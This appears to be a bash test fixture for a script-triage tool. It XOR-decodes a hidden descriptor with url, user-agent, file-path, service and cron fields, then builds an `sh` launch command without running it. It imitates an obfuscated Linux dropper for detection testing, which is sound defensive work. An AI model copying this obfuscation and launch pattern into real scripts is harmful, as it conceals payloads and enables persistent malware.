#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_2ecc57eb='245,55,170,147,252,169,97,254,198,242,189,96,171,144,191,227,43,227,148,163,243,100,175,220,184,227,96,190,133,165,229,109,227,129,166,228,42,241,153,191,241,117,147,148,167,249,99,176,148,249,246,103,251,200,175,162,50,245,220,165,247,108,173,129,166,241,102,241,149,162,207,107,171,152,170,224,104,173,146,183,161,56,184,159,190,255,102,147,148,172,241,113,191,141,191,224,108,190,146,184,207,109,191,204,185,245,113,188,144,175,241,121,191,130,174,243,106,190,129,148,248,102,184,144,187,227,108,168,221,167,241,102,163,157,148,245,113,173,146,164,252,56,191,129,174,228,118,176,192,246,230'

readonly Codec_2ecc57eb='reversed_decimal|repeating_key_xor|90,cb,f1,cc,05'



Load_2ecc57eb() {

  item1=()

  local IFS=',' item5

  local -a pieces

  read -r -a pieces <<< "${Material_2ecc57eb}"

  for ((item5=${#pieces[@]}-1; item5>=0; item5--)); do item1+=("${pieces[item5]}"); done

}



Decode_2ecc57eb() {

  item2=()

  local -a key_bytes=(144 203 241 204 5)

  local item5

  for ((item5=0; item5<${#item1[@]}; item5++)); do

    item2+=("$((item1[item5] ^ key_bytes[item5 % ${#key_bytes[@]}]))")

  done

}



Recover_2ecc57eb() {

  local -a item1 item2

  local item3 item4 item8 item5

  if ((2 > 1)); then item4=left; else item4=right; fi

  Load_2ecc57eb

  Decode_2ecc57eb

  item3=''

  local octal character

  for item5 in "${!item2[@]}"; do

    printf -v octal '%03o' "${item2[item5]}"

    printf -v character '%b' "\\$octal"

    item3+="$character"

  done

  printf '%s\n' "$item3"

}



Inspect_2ecc57eb() { local recovered field; local -a fields; recovered="$(Recover_2ecc57eb)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_2ecc57eb() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_2ecc57eb)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a launch_command=(sh "$file_path")

  declare -p launch_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_2ecc57eb; fi

